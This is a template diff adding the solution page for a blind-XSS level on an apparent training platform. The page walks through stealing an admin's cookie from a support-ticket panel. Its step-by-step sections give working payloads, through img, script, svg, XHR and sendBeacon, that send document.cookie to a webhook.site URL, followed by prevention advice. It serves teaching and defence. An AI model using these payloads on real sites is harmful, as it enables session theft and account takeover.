@@ -1,0 +1,161 @@
+{% extends 'base.html' %}
+
+{% block title %}XSS Level 12 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">XSS Level 12 Solution: Blind XSS with Webhook Exfiltration</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates a blind XSS vulnerability in a support ticket system. The payload is executed in an admin panel that you don't have direct access to, requiring you to use data exfiltration techniques to confirm the execution and retrieve sensitive information.
+                    </p>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-lightbulb-fill me-2 text-warning"></i>Solution</h3>
+                <p>
+                    To solve this challenge, you need to create a payload that will send the admin's cookie to your webhook service when the ticket is viewed in the admin panel.
+                </p>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Understanding the Vulnerability</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>Blind XSS occurs when the XSS payload is executed in a different context than where it was injected. In this case:</p>
+                        <ol>
+                            <li>You submit a support ticket with an XSS payload in the description field.</li>
+                            <li>The admin panel displays the ticket description without proper sanitization.</li>
+                            <li>When an admin views the ticket, the payload executes in their browser.</li>
+                            <li>Since you don't have access to the admin panel, you need to use a webhook to exfiltrate data.</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Step 1: Set Up a Webhook</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>First, you need to create a webhook endpoint to receive the exfiltrated data:</p>
+                        <ol>
+                            <li>Go to a webhook service like <a href="https://webhook.site" target="_blank">webhook.site</a> or <a href="https://requestbin.com" target="_blank">requestbin.com</a>.</li>
+                            <li>Create a new webhook and copy the unique URL provided.</li>
+                            <li>This URL will be used in your XSS payload to send the cookie data.</li>
+                        </ol>
+                        <p>Example webhook URL: <code>https://webhook.site/abcd1234-5678-90ef-ghij-klmnopqrstuv</code></p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Step 2: Craft the XSS Payload</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>Next, you need to create an XSS payload that will send the cookie to your webhook:</p>
+                        
+                        <h6>Basic Image-Based Payload</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;img src="x" onerror="fetch('https://webhook.site/YOUR-WEBHOOK-ID?cookie='+encodeURIComponent(document.cookie))"&gt;</code></pre>
+                        
+                        <h6>Script Tag Payload</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;script&gt;
+fetch('https://webhook.site/YOUR-WEBHOOK-ID?cookie='+encodeURIComponent(document.cookie))
+.then(() => alert('XSS Level 12 Completed!'));
+&lt;/script&gt;</code></pre>
+                        
+                        <h6>SVG-Based Payload</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;svg onload="fetch('https://webhook.site/YOUR-WEBHOOK-ID?cookie='+encodeURIComponent(document.cookie))"&gt;&lt;/svg&gt;</code></pre>
+                        
+                        <p>Replace <code>YOUR-WEBHOOK-ID</code> with your actual webhook URL.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Step 3: Submit the Ticket</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Fill out the support ticket form with your name, email, subject, and category.</li>
+                            <li>In the description field, paste your XSS payload.</li>
+                            <li>Enter your webhook URL in the webhook field.</li>
+                            <li>Submit the ticket.</li>
+                        </ol>
+                        <p>When the admin views the ticket, your payload will execute and send the cookie data to your webhook.</p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Step 4: Verify the Exfiltration</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Check your webhook service for incoming requests.</li>
+                            <li>You should see a request with the admin's cookie in the query parameters.</li>
+                            <li>The challenge will automatically detect if your payload successfully exfiltrated the cookie and reveal the flag.</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Alternative Approaches</h5>
+                    </div>
+                    <div class="card-body">
+                        <h6>1. Using XMLHttpRequest</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://webhook.site/YOUR-WEBHOOK-ID?cookie='+encodeURIComponent(document.cookie), true);
+xhr.send();
+&lt;/script&gt;</code></pre>
+                        
+                        <h6>2. Using a Hidden Image</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;img src="https://webhook.site/YOUR-WEBHOOK-ID?cookie='+encodeURIComponent(document.cookie)" style="display:none"&gt;</code></pre>
+                        
+                        <h6>3. Using Beacon API</h6>
+                        <pre class="bg-light p-3 rounded"><code>&lt;script&gt;
+navigator.sendBeacon('https://webhook.site/YOUR-WEBHOOK-ID', document.cookie);
+&lt;/script&gt;</code></pre>
+                    </div>
+                </div>
+                
+                <h3 class="mt-4"><i class="bi bi-shield-fill-check me-2 text-success"></i>Security Lessons</h3>
+                <div class="card">
+                    <div class="card-body">
+                        <h5>Vulnerabilities Demonstrated</h5>
+                        <ul>
+                            <li><strong>Blind XSS:</strong> XSS vulnerabilities that execute in contexts not directly visible to the attacker.</li>
+                            <li><strong>Data Exfiltration:</strong> Using external services to steal sensitive information.</li>
+                            <li><strong>Insufficient Input Sanitization:</strong> Failing to properly sanitize user input before displaying it in administrative interfaces.</li>
+                        </ul>
+                        
+                        <h5>Prevention Measures</h5>
+                        <ul>
+                            <li><strong>Content Security Policy (CSP):</strong> Implement a strict CSP to prevent data exfiltration to unauthorized domains.</li>
+                            <li><strong>Input Sanitization:</strong> Sanitize all user input before displaying it, even in administrative interfaces.</li>
+                            <li><strong>Output Encoding:</strong> Properly encode user-generated content when displaying it in HTML contexts.</li>
+                            <li><strong>HTTP-Only Cookies:</strong> Use HTTP-Only flags for sensitive cookies to prevent JavaScript access.</li>
+                            <li><strong>XSS Auditing:</strong> Use automated tools to scan for XSS vulnerabilities in administrative interfaces.</li>
+                        </ul>
+                        
+                        <h5>Real-World Implications</h5>
+                        <p>
+                            Blind XSS vulnerabilities are particularly dangerous because they often affect administrative interfaces with higher privileges. An attacker can use these vulnerabilities to steal admin cookies, hijack sessions, and gain unauthorized access to sensitive functionality. In real-world scenarios, blind XSS has been used to compromise entire organizations by targeting internal tools and administrative panels.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('xss_level12') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
